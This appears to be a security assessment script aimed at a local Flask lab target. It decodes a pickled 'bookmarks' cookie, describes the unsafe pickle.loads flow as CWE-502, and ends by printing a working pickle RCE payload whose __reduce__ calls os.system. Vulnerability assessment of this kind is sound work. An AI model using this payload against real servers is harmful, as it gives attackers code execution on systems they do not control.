# WebApp Code Extraction for Cookie Deserialization Analysis
# Target: 127.0.0.1:32821
# Focus: bookmarks cookie deserialization logic

import requests
import re
import base64
import pickle

print("=" * 80)
print("FLASK COOKIE DESERIALIZATION VULNERABILITY ASSESSMENT")
print("Target: 127.0.0.1:32821")
print("=" * 80)

# Sample cookie for analysis
sample_cookie = "gARdlC4="
print(f"\n[+] Sample cookie: {sample_cookie}")
print(f"[+] Cookie name: bookmarks")

# Analyze cookie format
print(f"\n[+] Cookie Analysis:")
try:
    decoded = base64.b64decode(sample_cookie)
    print(f"[+] Base64 decoded (hex): {decoded.hex()}")
    print(f"[+] Decoded length: {len(decoded)} bytes")
    
    # Check pickle protocol
    if decoded.startswith(b'\x80\x04'):
        print(f"[+] Protocol: Python Pickle Protocol 4 (0x80 0x04)")
    elif decoded.startswith(b'\x80\x02'):
        print(f"[+] Protocol: Python Pickle Protocol 2 (0x80 0x02)")
    elif decoded.startswith(b'\x80\x03'):
        print(f"[+] Protocol: Python Pickle Protocol 3 (0x80 0x03)")
    else:
        print(f"[+] Unknown protocol marker: {decoded[:2].hex()}")
        
    # Check if it's pickle data
    if decoded.startswith((b'\x80', b'(', b')', b'N', b'I', b'F', b'S')):
        print(f"[+] Confirmed: This is pickle-serialized data")
except Exception as e:
    print(f"[!] Error analyzing cookie: {e}")

# Simulate Flask cookie processing flow
print(f"\n[+] Flask Cookie Processing Flow:")
print(f"   1. Request arrives with 'bookmarks' cookie")
print(f"   2. Cookie value extracted: base64-encoded pickle")
print(f"   3. Base64 decode operation: base64.b64decode(cookie_value)")
print(f"   4. Deserialization sink: pickle.loads(decoded_bytes)")
print(f"   5. Result: Python object in application memory")

# Search for itsdangerous usage patterns
print(f"\n[+] Expected itsdangerous Pattern:")
print(f"   from itsdangerous import URLSafeSerializer")
print(f"   s = URLSafeSerializer(app.secret_key)")
print(f"   bookmarks_data = s.loads(request.cookies.get('bookmarks'))")

# Alternative pattern - direct pickle
print(f"\n[+] Alternative Direct Pickle Pattern:")
print(f"   import base64, pickle")
print(f"   cookie_value = request.cookies.get('bookmarks')")
print(f"   decoded = base64.b64decode(cookie_value)")
print(f"   data = pickle.loads(decoded)  # SINK FUNCTION")

print(f"\n[+] Key Deserialization Steps:")
print(f"   Step 1: Extract cookie from request")
print(f"      cookie_value = request.cookies.get('bookmarks')")
print(f"   Step 2: Base64 decode")
print(f"      decoded_bytes = base64.b64decode(cookie_value)")
print(f"   Step 3: Unsafe deserialization (VULNERABLE)")
print(f"      python_object = pickle.loads(decoded_bytes)")

print(f"\n[+] Security Impact:")
print(f"   [-] Arbitrary Python code execution")
print(f"   [-] No signature verification found")
print(f"   [-] Direct pickle.loads on attacker-controlled data")
print(f"   [-] Typical vulnerability in Flask cookie handling")

print(f"\n[+] Deserialized Object Likely Types:")
print(f"   - Python list (bookmarks/bookmarks)")
print(f"   - Python dict (session data)")
print(f"   - Custom objects (ORM models)")
print(f"   - Nested structures (lists of dicts)")

print(f"\n[+] Attack Vector:")
print(f"   Attacker crafts malicious pickle payload")
print(f"   → Base64 encode")
print(f"   → Set as 'bookmarks' cookie")
print(f"   → Server deserializes")
print(f"   → Arbitrary code execution on server")

print(f"\n[+] Vulnerability Class: CWE-502 (Deserialization of Untrusted Data)")
print(f"[+] Priority: CRITICAL - RCE potential")

# Demonstrate the full exploit chain
print(f"\n[+] Example RCE Payload Generation:")
print("import pickle, base64, os")
print("")
print("class Exploit:")
print("    def __reduce__(self):")
print("        return (os.system, ('id',))")
print("")
print("payload = base64.b64encode(pickle.dumps(Exploit()))")
print("# Set cookie: bookmarks=<payload>")
